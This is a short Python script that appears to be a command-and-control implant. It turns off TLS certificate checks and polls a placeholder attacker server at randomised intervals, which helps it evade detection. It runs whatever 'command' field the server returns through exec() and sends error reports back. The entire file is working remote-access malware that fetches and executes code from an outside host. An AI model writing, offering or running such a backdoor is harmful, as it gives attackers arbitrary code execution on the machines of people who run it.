import ssl
import json
import time
import random
import urllib
from urllib.request import urlopen, Request

context = ssl.create_default_context()
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE

server_ip = '<YOUR_IP_HERE>'
server_port = '<YOUR_PORT_HERE>'

url = f'https://{server_ip}:{server_port}/'

while True:
    request = Request(url)
    try:
        response = urlopen(request, context=context)

        if response.status != 200:
            continue

        payload = json.loads(response.read().decode())

        if 'command' in payload:
            try:
                exec(payload['command'])
            except Exception as e:
                data = urllib.parse.urlencode({'exception': e}).encode()
                request = Request(url, data=data)
                urlopen(request, context=context)

        time.sleep(random.uniform(5, 15))

    except Exception as e:
        time.sleep(random.uniform(60, 120))
